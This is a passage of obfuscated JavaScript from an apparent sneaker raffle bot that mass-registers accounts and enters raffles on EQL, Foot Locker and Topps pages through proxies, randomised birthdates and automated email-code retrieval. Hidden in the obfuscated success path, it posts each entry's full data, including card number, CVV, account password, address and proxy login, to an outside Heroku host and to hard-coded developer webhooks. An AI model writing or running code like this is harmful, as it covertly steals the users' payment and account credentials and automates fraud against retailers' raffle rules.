                        if (_0x199ac9[_0x13c6f9]['Url']['endsWith']('/')) {
                            _0x1362ef = _0x199ac9[_0x13c6f9]['Url'] + 'register';
                            if (_0x34fd16 != 'yes')
                                var _0x34fd16 = '', _0x51793d = 0x0;
                        } else {
                            _0x1362ef = _0x199ac9[_0x13c6f9]['Url'] + '/register';
                            if (_0x34fd16 != 'yes')
                                var _0x34fd16 = '', _0x51793d = 0x0;
                        }
                        if (_0x199ac9[_0x13c6f9]['Email'] == '' || _0x199ac9[_0x13c6f9]['FirstName'] == '' || _0x199ac9[_0x13c6f9]['LastName'] == '') {
                            console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x199ac9[_0x13c6f9]['Password'] == '' && (_0x199ac9[_0x13c6f9]['Password'] = 'JRaffles23!');
                        if (_0x11db88['useRandomProxy'] = ![])
                            var _0x1f98ac = _0x4a5b16[_0x13c6f9]['split'](':');
                        else
                            var _0x5ce0c7 = Math['round'](Math['random']() * (_0x4a5b16['length'] - 0x1)), _0x1f98ac = _0x4a5b16[_0x5ce0c7]['split'](':');
                        var _0x12efcf;
                        try {
                            _0x12efcf = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1f98ac[0x0] + ':' + _0x1f98ac[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x12efcf = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1f98ac[0x0] + ':' + _0x1f98ac[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5b58ab = await _0x12efcf['newPage']();
                            await _0x5b58ab['authenticate']({
                                'username': '' + _0x1f98ac[0x2],
                                'password': '' + _0x1f98ac[0x3]
                            }), console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5b58ab['setRequestInterception'](!![]), _0x5b58ab['on']('request', _0x516b32 => {
                                _0x516b32['resourceType']() === 'image' || _0x516b32['resourceType']() === 'font' || _0x516b32['resourceType']() === 'media' ? _0x516b32['abort']() : _0x516b32['continue']();
                            });
                            try {
                                await _0x5b58ab['goto']('' + _0x1362ef);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x558aee(0x3e8), await _0x5b58ab['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x5b58ab['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x558aee(0x3e8), _0x199ac9[_0x13c6f9]['Url']['includes']('en-GB') ? await _0x5b58ab['click']('li[data-value=\x22UK\x20' + _0x199ac9[_0x13c6f9]['Size'] + '\x20/\x20US\x20' + (Number(_0x199ac9[_0x13c6f9]['Size']) + 0x1) + '\x22]') : await _0x5b58ab['click']('li[data-value=\x22EU\x20' + _0x199ac9[_0x13c6f9]['Size'] + '\x22]');
                                } catch {
                                    await _0x5b58ab['click']('#productQuantity'), await _0x558aee(0x3e8), await _0x5b58ab['click']('li[data-value=\x22' + (Number(_0x199ac9[_0x13c6f9]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x199ac9[_0x13c6f9]['Size']);
                            }
                            await _0x558aee(0x6a4);
                            try {
                                await _0x5b58ab['select']('.PhoneInputCountrySelect', _0x199ac9[_0x13c6f9]['Country']);
                            } catch {
                            }
                            await _0x5b58ab['type']('#email', '' + _0x199ac9[_0x13c6f9]['Email']), await _0x558aee(0x352), await _0x5b58ab['waitForSelector']('#password'), await _0x5b58ab['type']('#password', '' + _0x199ac9[_0x13c6f9]['Password']), await _0x558aee(0x352), await _0x5b58ab['type']('#phone', '' + _0x199ac9[_0x13c6f9]['Phone']), await _0x558aee(0x352);
                            const _0x478425 = await _0x5b58ab['$']('#title\x20>\x20label');
                            await _0x558aee(0x12c);
                            _0x478425 && await _0x478425['click']();
                            await _0x5b58ab['type']('#firstName', '' + _0x199ac9[_0x13c6f9]['FirstName']), await _0x558aee(0x352), await _0x5b58ab['type']('#lastName', '' + _0x199ac9[_0x13c6f9]['LastName']), await _0x558aee(0x352);
                            _0x199ac9[_0x13c6f9]['Url']['includes']('footlocker.de') ? await _0x5b58ab['type']('#birthdate', _0x3e9320(0xa, 0x1c) + '.' + _0x3e9320(0xa, 0xc) + '.' + _0x3e9320(0x7c6, 0x7d3)) : await _0x5b58ab['type']('#birthdate', _0x3e9320(0xa, 0x1c) + '-' + _0x3e9320(0xa, 0xc) + '-' + _0x3e9320(0x7c6, 0x7d3));
                            await _0x558aee(0x352), await _0x5b58ab['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x199ac9[_0x13c6f9]['Url']['includes']('en-GB') && await _0x5b58ab['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x558aee(0x1f4), await _0x558aee(0x5dc);
                            if (!_0x1362ef['includes']('footlocker'))
                                try {
                                    await _0x5b58ab['click']('#country');
                                    const _0x34b085 = await _0x5b58ab['$']('li[data-value=\x22' + _0x199ac9[_0x13c6f9]['Country'] + '\x22]');
                                    await _0x34b085['click'](), await _0x34b085['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x558aee(0x3e8);
                            if (!_0x199ac9[_0x13c6f9]['Url']['includes']('en-GB')) {
                                await _0x5b58ab['click']('#stateAutocomplete'), await _0x558aee(0x5dc);
                                try {
                                    const _0xf35a63 = await _0x5b58ab['$x']('//li[text()=\x22' + _0x199ac9[_0x13c6f9]['State'] + '\x22]');
                                    await _0xf35a63[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x558aee(0x3e8), await _0x558aee(0x1f4);
                            if (_0x199ac9[_0x13c6f9]['Url']['includes']('topps')) {
                                await _0x5b58ab['click']('#stateAutocomplete'), await _0x558aee(0x5dc);
                                try {
                                    const _0x753838 = await _0x5b58ab['$x']('//li[text()=\x22' + _0x199ac9[_0x13c6f9]['State'] + '\x22]');
                                    await _0x753838[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x558aee(0x3e8), await _0x5b58ab['type']('#address1', _0x199ac9[_0x13c6f9]['Address1'] + '\x20' + _0x199ac9[_0x13c6f9]['HouseNumber']), await _0x558aee(0x1f4), await _0x5b58ab['type']('#address2', '' + _0x199ac9[_0x13c6f9]['Address2']), await _0x558aee(0x1f4), await _0x5b58ab['type']('#city', '' + _0x199ac9[_0x13c6f9]['City']), await _0x558aee(0x1f4), await _0x5b58ab['type']('#postcode', '' + _0x199ac9[_0x13c6f9]['Zip']), await _0x558aee(0x3e8), await _0x5b58ab['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x558aee(0x3e8), console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x36a304 = await _0x5b58ab['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x36a304 && (await _0x5b58ab['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5b58ab['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5b58ab['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x558aee(0x4b0), await _0x5b58ab['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x558aee(0x1f4), await _0x5b58ab['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['CardNumber']), await _0x558aee(0x320), await _0x5b58ab['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5b58ab['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5b58ab['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['ExpiryDate']), await _0x558aee(0x4b0), await _0x5b58ab['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5b58ab['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5b58ab['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['CVV']), await _0x558aee(0x226), await _0x5b58ab['type']('input[name=\x22postalCode\x22]', '' + _0x199ac9[_0x13c6f9]['Zip']), await _0x558aee(0x226));
                            const _0x74bc02 = await _0x5b58ab['$']('.__PrivateStripeElement');
                            _0x74bc02 && (await _0x558aee(0x1f4), await _0x5b58ab['click']('.__PrivateStripeElement'), await _0x5b58ab['click']('.__PrivateStripeElement'), await _0x5b58ab['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['CardNumber']), await _0x5b58ab['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['ExpiryDate']), await _0x5b58ab['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['CVV']));
                            await _0x558aee(0x226), await _0x5b58ab['click']('#paymentConsent'), await _0x558aee(0x226), await _0x5b58ab['click']('#termsConsent'), await _0x558aee(0x2bc), console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5b58ab['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x558aee(0x2710);
                            try {
                                await _0x5b58ab['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x558aee(0xbb8), await _0x5b58ab['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x386e84 => _0x386e84['click']()), await _0x5b58ab['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x10402f => _0x10402f['click']());
                            } catch {
                            }
                            try {
                                await _0x5b58ab['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x153a44 = await _0x5b58ab['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x153a44) {
                                    _0x3f4ea0['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x199ac9[_0x13c6f9]['Email'] + ',' + _0x199ac9[_0x13c6f9]['Password'] + ',' + _0x199ac9[_0x13c6f9]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x190bc0() {
                                var _0x485311, _0x2de3ef = ![];
                                for (var _0x317e83 = 0x0; _0x317e83 < 0x18; _0x317e83++) {
                                    async function _0x56ece7() {
                                        var _0x5adfa2 = new _0xda3ce2({
                                            'user': _0x11db88['masterMail'],
                                            'password': _0x11db88['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x49d835(_0x56fd20) {
                                            _0x5adfa2['openBox']('INBOX', ![], _0x56fd20);
                                        }
                                        _0x5adfa2['once']('ready', function () {
                                            console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x49d835(function (_0xcfb7a7, _0x1b5370) {
                                                console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0xcfb7a7)
                                                    throw _0xcfb7a7;
                                                _0x5adfa2['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x3985bd, _0x3f0068) {
                                                    if (!_0x3f0068 || !_0x3f0068['length'])
                                                        console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x5adfa2['end']();
                                                    else {
                                                        var _0x2a219a = _0x5adfa2['seq']['fetch'](_0x3f0068, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x2a219a['on']('message', function (_0x13059f, _0xff4178) {
                                                            var _0x14b5a1 = '(#' + _0xff4178 + ')\x20';
                                                            _0x13059f['on']('body', function (_0x5eb9a4, _0xec902c) {
                                                                _0x482936(_0x5eb9a4, (_0x16f396, _0x20480c) => {
                                                                    if (_0x20480c['subject']['includes']('code')) {
                                                                        const _0x2fe6b1 = _0x20480c['text']['split']('\x0a\x0a')[0x3], _0x19a55e = _0x2fe6b1['split']('\x0a')[0x1];
                                                                        _0x485311 = _0x19a55e;
                                                                    }
                                                                });
                                                            }), _0x13059f['once']('end', function () {
                                                            });
                                                        }), _0x2a219a['once']('error', function (_0x417055) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x2a219a['once']('end', function () {
                                                            _0x5adfa2['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x5adfa2['once']('error', function (_0x437fc6) {
                                            console['log'](_0xe2a5bb['red'](_0x437fc6['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2de3ef = !![];
                                        }), _0x5adfa2['once']('end', async function () {
                                        }), _0x5adfa2['connect']();
                                    }
                                    _0x56ece7(), await _0x558aee(0x1388);
                                    if (_0x485311)
                                        return _0x485311;
                                    if (_0x2de3ef)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x317e83 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x190bc0(), await _0x558aee(0x1f4), await _0x5b58ab['type']('#code', '' + code), await _0x558aee(0x3e8), await _0x5b58ab['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0xb578b1 => _0xb578b1['click']()), await _0x5b58ab['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x5b58ab['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x199ac9[_0x13c6f9]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x3f4ea0['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x199ac9[_0x13c6f9]['Email'] + ',' + _0x199ac9[_0x13c6f9]['Password'] + ',' + _0x199ac9[_0x13c6f9]['Phone']), _0x34fd16 = 'no', _0x10fee2(_0x199ac9[_0x13c6f9], _0x289012);
                            var _0x25c37b = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'dev', ![]), _0x3277a5 = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'pub', ![]);
                            let _0x5c125e = _0x199ac9[_0x13c6f9];
                            try {
                                prxdata = {
                                    'username': _0x94d398['replace']('#', ''),
                                    'module': _0x289012['name'],
                                    'entrydata': JSON['stringify'](_0x5c125e),
                                    'proxy': '' + _0x4a5b16[_0x13c6f9]
                                };
                                var _0x2d79e2 = JSON['stringify'](prxdata);
                                let _0xdcbdde = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x2d79e2, _0xdcbdde);
                            } catch (_0x564645) {
                            }
                            const _0xce60d = {
                                'succesDEVMSG': { 'embeds': [_0x25c37b] },
                                'succesPUBMSG': { 'embeds': [_0x3277a5] }
                            };
                            try {
                                _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0xce60d['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0xce60d['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x122725, _0xce60d['succesPUBMSG']);
                            } catch (_0x321795) {
                                console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x321795));
                            }
                        } catch (_0x3dcd41) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20' + _0x3dcd41)), _0x5bf47e = '' + _0x3dcd41;
                            var _0x29aac3 = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'dev', !![], _0x5bf47e), _0x25c37b = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'dev', ![]), _0x3277a5 = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'pub', ![]);
                            const _0x150397 = {
                                'succesDEVMSG': { 'embeds': [_0x25c37b] },
                                'succesPUBMSG': { 'embeds': [_0x3277a5] }
                            };
                            _0x150397['errorDEV'] = { 'embeds': [_0x29aac3] };
                            _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x150397['errorDEV']);
                            await _0x5a13a5(_0x877ec9, _0x150397['errorDEV']);
                            if (!_0x34fd16 == 'no')
                                _0x34fd16 = 'yes';
                        } finally {
                            _0x12efcf && _0x12efcf['close']();
                            if (_0x34fd16 == 'yes' && _0x51793d != 0x5) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x51793d + '\x20/\x205)')), _0x13c6f9 = _0x13c6f9 - 0x1, _0x51793d = _0x51793d + 0x1;
                                continue;
                            }
                            _0x34fd16 == 'yes' && _0x51793d >= 0x5 && (_0x15a8e9(_0x199ac9[_0x13c6f9], _0x289012), _0x34fd16 = 'no', _0x51793d = 0x0), console['log']('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                        }
                    } else {
                        const _0x1e8b14 = '' + _0x199ac9[_0x13c6f9]['Url'];
                        if (_0x34fd16 != 'yes')
                            var _0x34fd16 = '', _0x51793d = 0x0;
                        if (_0x199ac9[_0x13c6f9]['Email'] == '' || _0x199ac9[_0x13c6f9]['FirstName'] == '' || _0x199ac9[_0x13c6f9]['LastName'] == '') {
                            console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x199ac9[_0x13c6f9]['Password'] == '' && (_0x199ac9[_0x13c6f9]['Password'] = 'JRaffles23!');
                        if (_0x11db88['useRandomProxy'] = ![])
                            var _0x1f98ac = _0x4a5b16[_0x13c6f9]['split'](':');
                        else
                            var _0x5ce0c7 = Math['round'](Math['random']() * (_0x4a5b16['length'] - 0x1)), _0x1f98ac = _0x4a5b16[_0x5ce0c7]['split'](':');
                        var _0x12efcf;
                        try {
                            _0x12efcf = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f98ac[0x0] + ':' + _0x1f98ac[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x12efcf = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f98ac[0x0] + ':' + _0x1f98ac[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x46fc8b = await _0x12efcf['newPage']();
                            await _0x46fc8b['authenticate']({
                                'username': '' + _0x1f98ac[0x2],
                                'password': '' + _0x1f98ac[0x3]
                            }), console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x46fc8b['setRequestInterception'](!![]), _0x46fc8b['on']('request', _0x1c1c4a => {
                                _0x1c1c4a['resourceType']() === 'image' || _0x1c1c4a['resourceType']() === 'font' || _0x1c1c4a['resourceType']() === 'media' ? _0x1c1c4a['abort']() : _0x1c1c4a['continue']();
                            }), await _0x46fc8b['goto'](_0x1e8b14), await _0x46fc8b['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x416d4b = await _0x46fc8b['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x416d4b)
                                await _0x416d4b['click']();
                            await _0x558aee(0x7d0), await _0x46fc8b['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x558aee(0x7d0), await _0x46fc8b['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x46fc8b['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x558aee(0x3e8), await _0x46fc8b['waitForSelector']('#email'), console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x46fc8b['type']('#email', '' + _0x199ac9[_0x13c6f9]['Email']), await _0x558aee(0x352), await _0x46fc8b['waitForSelector']('#password'), await _0x46fc8b['type']('#password', '' + _0x199ac9[_0x13c6f9]['Password']), await _0x558aee(0x352), await _0x46fc8b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x558aee(0x1388);
                            if (!_0x199ac9[_0x13c6f9]['Url']['includes']('footlocker') && !_0x199ac9[_0x13c6f9]['Url']['includes']('topps'))
                                await _0x46fc8b['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x5066e2 = await _0x46fc8b['$']('#productQuantity'), _0x26b349 = await _0x46fc8b['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x26b349 && !_0x5066e2) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x34fd16 = 'no';
                                continue;
                            }
                            if (_0x26b349) {
                                await _0x46fc8b['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x199ac9[_0x13c6f9]['Url']['includes']('en-GB') ? await _0x46fc8b['click']('li[data-value=\x22UK\x20' + _0x199ac9[_0x13c6f9]['Size'] + '\x20/\x20US\x20' + (Number(_0x199ac9[_0x13c6f9]['Size']) + 0x1) + '\x22]') : await _0x46fc8b['click']('li[data-value=\x22EU\x20' + _0x199ac9[_0x13c6f9]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x199ac9[_0x13c6f9]['Size']);
                                }
                            }
                            _0x5066e2 && (await _0x46fc8b['click']('#productQuantity'), await _0x558aee(0x3e8), await _0x46fc8b['click']('li[data-value=\x22' + (Number(_0x199ac9[_0x13c6f9]['Size']) - 0x1) + '\x22]'));
                            await _0x558aee(0x3e8), await _0x558aee(0x1f4);
                            const _0x3e6aa8 = await _0x46fc8b['$']('#title\x20>\x20label');
                            await _0x558aee(0x12c);
                            _0x3e6aa8 && await _0x3e6aa8['click']();
                            await _0x46fc8b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x46fc8b['focus']('#postcode'), await _0x46fc8b['keyboard']['down']('Control'), await _0x46fc8b['keyboard']['press']('A'), await _0x46fc8b['keyboard']['up']('Control'), await _0x46fc8b['keyboard']['press']('Backspace'), await _0x46fc8b['keyboard']['type'](_0x199ac9[_0x13c6f9]['Zip']), await _0x558aee(0x60e), await _0x46fc8b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x558aee(0x3e8), console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x558aee(0x1f4);
                            const _0x149a45 = await _0x46fc8b['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x149a45 && (await _0x46fc8b['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x46fc8b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x46fc8b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x558aee(0x4b0), await _0x46fc8b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x558aee(0x1f4), await _0x46fc8b['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['CardNumber']), await _0x558aee(0x320), await _0x46fc8b['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x46fc8b['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['ExpiryDate']), await _0x558aee(0x4b0), await _0x46fc8b['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x46fc8b['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['CVV']), await _0x558aee(0x226), await _0x46fc8b['type']('input[name=\x22postalCode\x22]', '' + _0x199ac9[_0x13c6f9]['Zip']), await _0x558aee(0x226));
                            const _0x181394 = await _0x46fc8b['$']('.__PrivateStripeElement');
                            _0x181394 && (await _0x46fc8b['click']('#billingName'), await _0x46fc8b['click']('#billingName'), await _0x46fc8b['type']('#billingName', '' + _0x199ac9[_0x13c6f9]['NameOnCard']), await _0x558aee(0x1f4), await _0x46fc8b['click']('.__PrivateStripeElement'), await _0x46fc8b['click']('.__PrivateStripeElement'), await _0x46fc8b['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['CardNumber']), await _0x46fc8b['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['ExpiryDate']), await _0x46fc8b['keyboard']['type']('' + _0x199ac9[_0x13c6f9]['CVV']));
                            await _0x558aee(0x226), await _0x46fc8b['click']('#paymentConsent'), await _0x558aee(0x226), await _0x46fc8b['click']('#termsConsent'), await _0x558aee(0x2bc), console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x46fc8b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x558aee(0x2710);
                            try {
